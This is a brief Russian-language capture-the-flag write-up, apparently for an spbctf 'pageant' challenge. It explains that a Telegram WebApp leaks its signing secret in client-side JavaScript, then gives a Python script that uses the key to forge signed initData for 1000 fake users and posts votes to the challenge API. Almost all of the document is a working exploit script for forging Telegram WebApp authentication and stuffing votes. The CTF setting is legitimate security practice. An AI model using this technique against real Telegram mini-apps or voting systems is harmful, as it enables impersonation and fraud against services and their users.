С помощью pyrogram/telethon находим адрес WebApp'а.

Замечаем, что в функции checkWebAppSignature (.js) сохранен secretKey.

Подделываем dataCheckString, накручиваем голоса

```pyt
import hashlib
import hmac
import requests 
import urllib.parse as urlen
import base64

secret_key = "0b4162a45f8c74b4005a25d4c20b0158198c83b38462bd02e42cd18f9842dc83"
secret_key = bytes.fromhex(secret_key)
def get_hash(string):
    hash_ = hmac.new(secret_key, string.encode(), hashlib.sha256)
    return hash_.hexdigest()


def build_init_data(string, hash):
    #s = r'{"initData":"' + urlen.quote(string.replace('\n', '&') + '&hash=' + hash, '=&') + r'"}'
    s = '\"' + urlen.quote(string.replace('\n', '&') , '=&')+ '&hash=' + hash + '\"'
    #print(s)
    return s#json.loads(s)

#hash_exp = '096d05c6aa9c3795d573f6249acbc0efbdac00723c70772e63c41c3851ea484f'
#'query_id=AAFu1K4gAAAAAG7UriC51g7_&user=%7B%22id%22%3A548328558%2C%22first_name%22%3A%22%E3%83%A9%E3%82%A4%E3%82%AA%E3%83%B3%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22stupidentityfromblackhole%22%2C%22language_code%22%3A%22ru%22%2C%22allows_write_to_pm%22%3Atrue%7D&auth_date=1713613851&hash=6f96e403aa49b0266cb9bbe742aa3dbc43d848dfafa17f2af98376a9cf502d8c'

for i in range(1000):

    string = 'auth_date=171361'+str(i)+'\nquery_id=AAFu1K4gAAAAAG7UriBnTjRx\nuser={"id":54832' + str(i) + ',"first_name":"Lev","last_name":"","username":"stupidentityfromblackhole","language_code":"ru","allows_write_to_pm":true}'
    string2 = 'query_id=AAFu1K4gAAAAAG7UriBnTjRx&user={"id":54832' + str(i) + ',"first_name":"Vvvvvv","last_name":"","username":"stupidentityfromblackhole","language_code":"ru","allows_write_to_pm":true}&auth_date=171361'+str(i)+'&'
    string2 = r'"' + urlen.quote(string2, '=&') + 'hash=' + get_hash(string) + r'"'

    #s = build_init_data(string, get_hash(string))
    url2 = 'https://t-pageant-ekbooq0e.spbctf.net/api/vote'

    #print(string2, base64.b64encode(string2.encode()))
    r2 = requests.post(url2, headers={'Content-Type': 'application/json', \
                                      "accept": "*/*", \
                                      "cache-control": "no-cache", \
                                      "origin": "https://t-pageant-ekbooq0e.spbctf.net", \
                                      "pragma": "no-cache", \
                                      'authorization': f"Bearer {base64.b64encode(string2.encode()).decode()}", \
                                      'referer': 'https://t-pageant-ekbooq0e.spbctf.net/7b47448f-7cff-4c89-b73c-99c6e74bf6ec'}, \ #change
                                        data=r'{"contestant_id": 310}')  #change
    print(r2.content)
```
